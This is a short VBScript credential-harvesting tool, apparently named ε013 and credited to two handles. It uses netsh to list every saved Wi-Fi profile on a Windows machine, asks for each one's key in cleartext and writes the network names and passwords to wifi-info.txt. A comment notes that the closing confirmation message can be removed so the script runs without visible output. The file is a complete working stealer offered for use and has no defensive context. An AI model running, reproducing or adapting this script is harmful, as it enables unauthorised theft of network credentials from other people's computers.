'//////////////////////////////////////////////
'//          ε013 V 2.0 (Classic)
'//          Jordan Dalcq - 0v3rl0w
'//			 Leonardo Ferreira - B166er
'/////////////////////////////////////////////

Function GetOutput(command)
    Set Shell = Wscript.CreateObject("WScript.Shell")
    Set cmd = Shell.Exec("cmd /c  " & command)
    strOut = ""

    Do While Not cmd.StdOut.AtEndOfStream
        strOut = strOut & cmd.StdOut.ReadLine() & "\n"
    Loop
    GetOutput=strOut
End Function

Function saveIt(wifi, passwd)
    Set objFSO=CreateObject("Scripting.FileSystemObject")
    If Not objFSO.FileExists("wifi-info.txt") Then 
        Set objFile=objFSO.CreateTextFile("wifi-info.txt") 
    Else
        Set objFile=objFSO.OpenTextFile("wifi-info.txt", 8, True) 
    End If
    objFile.WriteLine("wifi: " & wifi & " Senha: " & passwd) 
    objFile.Close
End Function

strText=Split(GetOutput("netsh wlan show profile"), "\n")

i = 0

For Each x in strText
    If i > 8 And i < Ubound(strText)-1 Then
        Name = Split(x, ": ")(1)
        str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
        passwd = Split(str, ": ")
        If Ubound(passwd) Then
            saveIt Name, passwd(1)
        End If
    End If
    i = i + 1
Next

WScript.Echo "Dados extraídos e salvos em wifi-info.txt" 'Essa linha pode ser retirada, ela é apenas uma confirmação visual do término do script.
